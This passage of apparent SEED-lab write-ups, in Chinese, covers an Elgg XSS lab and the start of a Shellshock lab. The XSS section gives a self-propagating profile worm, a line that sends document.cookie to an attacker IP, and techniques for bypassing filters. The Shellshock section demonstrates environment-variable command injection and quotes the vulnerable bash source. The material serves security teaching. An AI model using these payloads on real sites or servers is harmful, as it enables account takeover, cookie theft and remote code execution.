class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;__elgg_token&quot;</span><br><br>B4kETnpwfAY<span class="hljs-number">-9</span>_DqgFrU3Q<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;__elgg_ts&quot;</span><br><br><span class="hljs-number">1665148744</span><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;name&quot;</span><br><br>Boby<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;description&quot;</span><br><br>&lt;p&gt;wndmd nmsl hhhhh&lt;/p&gt;<br><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;accesslevel[description]&quot;</span><br><br><span class="hljs-number">0</span><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;briefdescription&quot;</span><br><br>???????????!!!!!!!!!!!!!!<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;accesslevel[briefdescription]&quot;</span><br><br><span class="hljs-number">2</span><br><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;guid&quot;</span><br><br><span class="hljs-number">57</span><br><br></code></pre></td></tr></table></figure><p>按照上面字段填充代码，主要问题在于content字符串的构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = function()&#123;<br>        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        <span class="hljs-keyword">var</span> content=token + ts + userName +<br>            <span class="hljs-string">&quot;&amp;description=IamAlice&amp;accesslevel[description]=2&quot;</span> + guid;<br>        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">56</span>;<br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)<br>        &#123;<br>            <span class="hljs-keyword">var</span> Ajax=<span class="hljs-keyword">null</span>;<br>            Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-keyword">true</span>);<br>            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            Ajax.send(content);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>以html形式输入到Alice的“about me”中，每一个看到Alice的主页的人的“about me”都会被修改</p><p>Question 3: Why do we need Line ? Remove this line, and repeat your attack. Report and explainyour observation.</p><p>防止Alice自己的“about me”被修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> id=worm&gt;<br>    <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> name=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>    <br>        <span class="hljs-keyword">var</span> description = <span class="hljs-string">&quot;&amp;description=&lt;p&gt;Your profile have been attacked!!!&lt;\/p&gt;&quot;</span>&#125;<br>        <span class="hljs-keyword">var</span> scriptstr = <span class="hljs-string">&quot;&lt;script type=\&quot;text\/javascript\&quot; id=worm&gt;&quot;</span> + <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;worm&quot;</span>).innerHTML + <span class="hljs-string">&quot;&lt;\/script&gt;&quot;</span>;<br>    <br>        <span class="hljs-keyword">var</span> content=token + ts + description + <span class="hljs-built_in">encodeURIComponent</span>(scriptstr) + guid + name;<br>    <br>        Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>        Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;/action/profile/edit&quot;</span>,<span class="hljs-literal">true</span>);<br>        Ajax.setRequestHeader(<span class="hljs-string">&quot;Host&quot;</span>,<span class="hljs-string">&quot;www.xsslabelgg.com&quot;</span>);<br>        Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>        Ajax.send(content);<br>    &#125;<br>&lt;/script&gt;<br><span class="hljs-comment">//引用自https://blog.csdn.net/qq_39678161/article/details/119908242</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;worm&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> jsCode = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;worm&quot;</span>).innerHTML;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;</span></span><br><span class="javascript"><span class="xml">        </span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> content=token + ts + userName +</span></span><br><span class="javascript"><span class="xml">            <span class="hljs-string">&quot;&amp;description=&quot;</span> + wormCode + <span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span> + </span></span><br><span class="javascript"><span class="xml">            <span class="hljs-string">&quot;&amp;briefdescription=samy%20is%20my%20hero&amp;accesslevel[briefdescription]=2&quot;</span> +</span></span><br><span class="javascript"><span class="xml">            guid;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span></span><br><span class="javascript"><span class="xml">        </span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)</span></span><br><span class="javascript"><span class="xml">        &#123;</span></span><br><span class="javascript"><span class="xml">            <span class="hljs-keyword">var</span> Ajax=<span class="hljs-literal">null</span>;</span></span><br><span class="javascript"><span class="xml">            Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();</span></span><br><span class="javascript"><span class="xml">            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);</span></span><br><span class="javascript"><span class="xml">            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,</span></span><br><span class="javascript"><span class="xml">                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="javascript"><span class="xml">            Ajax.send(content);</span></span><br><span class="javascript"><span class="xml">        &#125;</span></span><br><span class="javascript"><span class="xml">    &#125;</span></span><br><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">//引用自https://blog.csdn.net/l4kjih3gfe2dcba1/article/details/118768821</span><br></code></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以在myscripts.js中插入恶意代码，例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;恶意代码已执行！&#x27;</span>);</span><br></code></pre></td></tr></table></figure><p>当用户访问包含上述代码的网页时，恶意代码将被执行，弹出一个警告框</p><p>如果攻击者希望通过 JavaScript 代码将 cookie 发送给自己，可以如下构造js代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>当 JavaScript 插入 img 标记时，浏览器尝试从 src 字段中的 URL 加载图像; 这导致向攻击者的机器发送 HTTP GET 请求</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>XSS攻击可以分为以下几种类型：</p><ol><li>存储型XSS攻击，又称持久型XSS：攻击者将恶意脚本代码存储在Web应用程序的数据库中，当用户访问包含该恶意代码的页面时，恶意代码会被执行。</li><li>反射型XSS攻击，又称非持久型XSS：攻击者将恶意脚本代码作为参数发送给Web应用程序，Web应用程序将该参数反射回给用户，从而执行恶意代码。</li><li>DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。</li></ol><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ol><li>HTML编码绕过：攻击者通过对恶意脚本代码进行HTML编码，从而绕过应用程序的过滤和验证。</li><li>JavaScript编码绕过：攻击者通过对恶意脚本代码进行JavaScript编码，从而绕过应用程序的过滤和验证。</li><li>DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。</li></ol><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ol><li>Unicode编码：攻击者通过对恶意脚本代码进行Unicode编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>\u003Cscript\u003Ealert(&#39;XSS&#39;)\u003C/script\u003E</code>。</li><li>Base64编码：攻击者通过对恶意脚本代码进行Base64编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>PHNjcmlwdD5hbGVydCgnWFMnKTwvc2NyaXB0Pg==</code>。</li><li>十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>。</li><li>双重编码：攻击者通过对恶意脚本代码进行双重HTML编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E</code>。</li><li>十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>编码为<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>。</li></ol><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><ul><li>使用HTTPOnly Cookie。HTTPOnly Cookie只能通过HTTP协议传输，无法通过JavaScript等脚本语言访问，从而防止恶意脚本代码访问Cookie。这样，即使恶意脚本代码能够注入到网页中，也无法窃取用户的会话信息</li></ul>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：shellshock</title>
    <link href="/p/9eb48b8c/"/>
    <url>/p/9eb48b8c/</url>
    
    <content type="html"><![CDATA[<h1 id="shellshock原理"><a href="#shellshock原理" class="headerlink" title="shellshock原理"></a>shellshock原理</h1><p>shellshock被记录在CVE-2014-6271，具有 9.8 CRITICAL的威胁评分，于2014年9月24日公开发布</p><p>简单来说，当父进程fork出子进程的时候，子进程会继承父进程的环境变量，但是由于bash错误的处理机制，导致环境变量被解释成了函数，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行</p><p>下面用代码来演示一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">[04/14/2021 00:28] seed@ubuntu:~$ foo=&#x27;() &#123; echo &quot;wdnmd&quot;; &#125; ;echo &quot;8848&quot;;&#x27; # foo是一个字符串<br>[04/14/2021 00:29] seed@ubuntu:~$ echo $foo<br>() &#123; echo &quot;wdnmd&quot;; &#125; ;echo &quot;8848&quot;; #打印出字符串foo的内容<br>[04/14/2021 00:29] seed@ubuntu:~$ export foo #将foo作为环境变量导出<br>[04/14/2021 00:29] seed@ubuntu:~$ bash #开一个子进程<br>8848 #这里自动运行了echo 8848命令<br>[04/14/2021 00:29] seed@ubuntu:~$ declare -f foo<br>foo () <br>&#123; <br>    echo &quot;wdnmd&quot;<br>&#125;<br></code></pre></td></tr></table></figure><p>由上可以发现，foo本来是一个shell变量，但是在export foo使其成为环境变量后，在子shell进程中，foo成为了一个函数，并且命令行自动执行了echo “8848”的命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">foo=&#x27;<span class="hljs-params">()</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wdnmd&quot;</span>; &#125; ;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;8848&quot;</span>;&#x27;<br>foo  <span class="hljs-params">()</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wdnmd&quot;</span>; &#125; ;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;8848&quot;</span>;<br></code></pre></td></tr></table></figure><p>shellshock的出现是bash源码中variable.c文件的bug导致的,子进程在传递父进程的环境变量的时候，匹配到() {这四个字符，‘=’会被空格替代，因此就会将其解释为函数</p><p>如果字符串是一个函数定义，那么该函数将只解析它，而不执行它。如果字符串包含一个 shell 命令，那么该函数将执行它；倘若该环境变量字符串包含多个用分号；隔开的shell命令，parse_and_execute函数会执行每一条命令</p><p><img src="/image/seed/20210415142147.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c">initialize_shell_variables (env, privmode)<br>     <span class="hljs-keyword">char</span> **env;<br>     <span class="hljs-keyword">int</span> privmode;<br>&#123;<br>  <span class="hljs-keyword">char</span> *name, *<span class="hljs-built_in">string</span>, *temp_string;<br>  <span class="hljs-keyword">int</span> c, char_index, string_index, string_length;<br>  SHELL_VAR *temp_var;<br><br>  create_variable_tables ();<br><br>  <span class="hljs-keyword">for</span> (string_index = <span class="hljs-number">0</span>; <span class="hljs-built_in">string</span> = env[string_index++]; )<br>    &#123;<br><br>      char_index = <span class="hljs-number">0</span>;<br>      name = <span class="hljs-built_in">string</span>;<br>      <span class="hljs-keyword">while</span> ((c = *<span class="hljs-built_in">string</span>++) &amp;&amp; c != <span class="hljs-string">&#x27;=&#x27;</span>)<br>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>[<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>char_index = <span class="hljs-built_in">string</span> - name - <span class="hljs-number">1</span>;<br><br>      <span class="hljs-comment">/* If there are weird things in the environment, like `=xxx&#x27; or a</span><br><span class="hljs-comment"> string without an `=&#x27;, just skip them. */</span><br>      <span class="hljs-keyword">if</span> (char_index == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* ASSERT(name[char_index] == &#x27;=&#x27;) */</span><br>      name[char_index] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>      <span class="hljs-comment">/* Now, name = env variable name, string = env variable value, and</span><br><span class="hljs-comment"> char_index == strlen (name) */</span><br><br>      temp_var = (SHELL_VAR *)<span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-comment">/* If exported function, define it now.  Don&#x27;t import functions from</span><br><span class="hljs-comment"> the environment in privileged mode. */</span><br>      <span class="hljs-keyword">if</span> (privmode == <span class="hljs-number">0</span> &amp;&amp; read_but_dont_execute == <span class="hljs-number">0</span> &amp;&amp; STREQN (<span class="hljs-string">&quot;() &#123;&quot;</span>, <span class="hljs-built_in">string</span>, <span class="hljs-number">4</span>))<br>&#123;<br>  string_length = <span class="hljs-built_in">strlen</span> (<span class="hljs-built_in">string</span>);<br>  temp_string = (<span class="hljs-keyword">char</span> *)xmalloc (<span class="hljs-number">3</span> + string_length + char_index);<br><br>  <span class="hljs-built_in">strcpy</span> (temp_string, name);<br>  temp_string[char_index] = <span class="hljs-string">&#x27; &#x27;</span>;<br>  <span class="hljs-built_in">strcpy</span> (temp_string + char_index + <span class="hljs-number">1</span>, <span class="hljs-built_in">string</span>);<br><br>  parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);<br><br>  <span class="hljs-comment">/* Ancient backwards compatibility.  Old versions of bash exported</span><br><span class="hljs-comment">     functions like name()=() &#123;...&#125; */</span><br>  <span class="hljs-keyword">if</span> (name[char_index - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; name[char_index - <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;(&#x27;</span>)<br>    name[char_index - <span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>  <span class="hljs-keyword">if</span> (temp_var = find_function (name))<br>    &#123;<br>      VSETATTR (temp_var, (att_exported|att_imported));<br>      array_needs_making = <span class="hljs-number">1</span>;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    report_error (_(<span class="hljs-string">&quot;error importing function definition for `%s&#x27;&quot;</span>), name);<br><br>  <span class="hljs-comment">/* ( */</span><br>  <span class="hljs-keyword">if</span> (name[char_index - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; name[char_index - <span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    name[char_index - <span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;(&#x27;</span>;<span class="hljs-comment">/* ) */</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="shellshock攻击CGI程序如何可能"><a href="#shellshock攻击CGI程序如何可能" class="headerlink" title="shellshock攻击CGI程序如何可能"></a>shellshock攻击CGI程序如何可能</h2><p>许多 Web 服务器支持 CGI，这是一种用于在 Web 页面和 Web 应用程序上生成动态内容的标准方法。</p><p>许多 CGI 程序都是 shell 脚本，因此在实际的 CGI 程序运行之前，将首先调用一个 shell 程序，这样的调用由远程计算机上的用户触发。如果 shell 程序是易受攻击的 bash 程序，我们可以利用易受攻击的 Shellshock 来获得服务器上的特权</p><p>当用户将CGI URL发送到Apache Web服务器时，Apache将检查该请求，如果是CGI请求，Apache将使用fork()启动新进程，然后使用exec())函数执行CGI程序</p><p>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会</p><p><img src="/image/seed/20210415142148.png"></p><h2 id="shellshock危害"><a href="#shellshock危害" class="headerlink" title="shellshock危害"></a>shellshock危害</h2><ul><li><p>拒绝服务攻击</p><ul><li>注入诸如/bin/sleep 20的语句让服务器睡眠</li></ul></li><li><p>远程代码执行</p><ul><li>本质上是一种注入攻击</li></ul></li><li><p>影响范围</p><ul><li>运行CGI脚本的Apache HTTP 服务器• </li><li>使用CGI作为网络接口的基于Linux的路由器</li><li> 使用Bash的各种网络服务</li><li> SSH、DHCP等</li></ul></li></ul><h1 id="seedlab环境配置"><a href="#seedlab环境配置" class="headerlink" title="seedlab环境配置"></a>seedlab环境配置</h1><ul><li>设置ip域名映射<ul><li>在文件/etc/hosts/中追加：<code>10.9.0.80 www.seedlab-shellshock.com</code></li><li>其中，10.9.0.80是web服务器容器的ip地址</li></ul></li><li>下载实验材料<ul><li><code>curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Shellshock/Labsetup.zip -o Labsetup.zip </code></li></ul></li><li>运行容器<ul><li>在docker-compose目录运行<code>docker-compose build</code>和<code>docker-compose up</code>命令，分别对应容器镜像的生成和容器的运行</li></ul></li></ul><p>seed提供的虚拟机默认设置了alias，比如</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span><br>$ dcup <span class="hljs-comment"># Alias for: docker-compose up</span><br>$ dcdown <span class="hljs-comment"># Alias for: docker-compose down</span><br>$ dockps <span class="hljs-regexp">//</span> Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br>$ docksh &lt;id&gt; <span class="hljs-regexp">//</span> Alias <span class="hljs-keyword">for</span>: docker exec -it &lt;id&gt; <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>因此我们可以通过docksh <id>进入容器内并运行命令行</p><p>下载lab文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Shellshock/Labsetup.zip -o Labsetup.zip<br>````<br><br>解压<br><br>```shell<br>unzip Labsetup.zip<br></code></pre></td></tr></table></figure><p>在这个lab中，我们将对 Web 服务器容器发起一次 Shellshock 攻击</p><h1 id="Passing-Data-to-Bash-via-Environment-Variable"><a href="#Passing-Data-to-Bash-via-Environment-Variable" class="headerlink" title="Passing Data to Bash via Environment Variable"></a>Passing Data to Bash via Environment Variable</h1><p>为了在基于 bash 的 CGI 程序中利用 shellshock漏洞，攻击者需要将他们的数据传递给易受攻击的 bash 程序，并且数据需要通过一个环境变量传递</p><p>使用curl 命令行工具可以允许用户控制 HTTP 请求中的大多数字段</p><ul><li>-v 字段可以打印出 HTTP 请求的头部</li><li>-A：设置User-Agent</li><li>-e：设置Referer</li><li>-H：添加自定义的 HTTP 请求头<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br><span class="hljs-meta">$</span><span class="bash"> curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br><span class="hljs-meta">$</span><span class="bash"> curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br></code></pre></td></tr></table></figure></li></ul><p>使用HTTP Header Live 扩展来捕获 HTTP 